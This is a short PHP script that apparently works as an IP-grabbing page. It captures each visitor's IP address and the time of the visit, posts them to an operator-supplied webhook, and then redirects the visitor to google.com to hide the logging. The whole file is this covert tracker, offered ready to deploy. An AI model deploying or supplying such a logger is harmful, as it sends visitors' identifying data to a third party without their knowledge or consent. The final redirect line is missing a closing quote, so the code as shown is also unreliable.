<?php
$webhookurl = "PUT_YOUR_WEBHOOK_HERE";
$ip= $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$msg = "**IP** $ip 
**Time** $TheirTime
**Date** $TheirDate
**--------------------------**";
$json_data = array ('content'=>"$msg");
$make_json = json_encode($json_data);
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
header("Location: http://google.com/);
?>
